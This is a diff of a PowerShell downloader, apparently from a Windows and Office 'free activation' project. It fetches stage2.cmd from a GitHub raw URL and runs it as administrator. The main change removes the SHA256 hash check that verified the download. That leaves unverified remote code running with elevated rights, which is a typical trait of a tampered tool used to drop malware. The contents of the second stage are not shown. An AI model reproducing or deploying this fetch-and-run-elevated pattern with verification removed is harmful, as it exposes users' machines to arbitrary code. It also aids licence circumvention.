@@ -49,7 +49,9 @@ if (-not $args) {
     try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
 
     $URLs = @(
-        'https://raw.githubusercontent.com/CodewithMubasher/activate-windows-and-office-free/refs/heads/main/stage2.cmd',
+        'https://raw.githubusercontent.com/CodewithMubasher/activate-windows-and-office-free/refs/heads/main/stage2.cmd'
+    )
+
     Write-Progress -Activity "Downloading..." -Status "Please wait"
     $errors = @()
     foreach ($URL in $URLs | Sort-Object { Get-Random }) {
@@ -80,26 +82,12 @@ if (-not $args) {
         return
     }
 
-    # Verify script integrity
-    $releaseHash = '850F979665FB93999ACAE93F4790C1FF8ED2041532060B7966A121C2D29A0BFA'
-    $stream = New-Object IO.MemoryStream
-    $writer = New-Object IO.StreamWriter $stream
-    $writer.Write($response)
-    $writer.Flush()
-    $stream.Position = 0
-    $hash = [BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($stream)) -replace '-'
-    if ($hash -ne $releaseHash) {
-        Write-Warning "Hash ($hash) mismatch, aborting!`nReport this issue at $troubleshoot"
-        $response = $null
-        return
-    }
-
     # Check for AutoRun registry which may create issues with CMD
     $paths = "HKCU:\SOFTWARE\Microsoft\Command Processor", "HKLM:\SOFTWARE\Microsoft\Command Processor"
-    foreach ($path in $paths) { 
-        if (Get-ItemProperty -Path $path -Name "Autorun" -ErrorAction SilentlyContinue) { 
+    foreach ($path in $paths) {
+        if (Get-ItemProperty -Path $path -Name "Autorun" -ErrorAction SilentlyContinue) {
             Write-Warning "Autorun registry found, CMD may crash! `nManually copy-paste the below command to fix...`nRemove-ItemProperty -Path '$path' -Name 'Autorun'"
-        } 
+        }
     }
 
     $rand = [Guid]::NewGuid().Guid
@@ -124,8 +112,8 @@ if (-not $args) {
     }
     else {
         Start-Process -FilePath $env:ComSpec -ArgumentList "/c """"$FilePath"" -el $args""" -Wait -Verb RunAs
-    }    
-    
+    }
+
     CheckFile $FilePath
     Remove-Item -Path $FilePath
 } @args
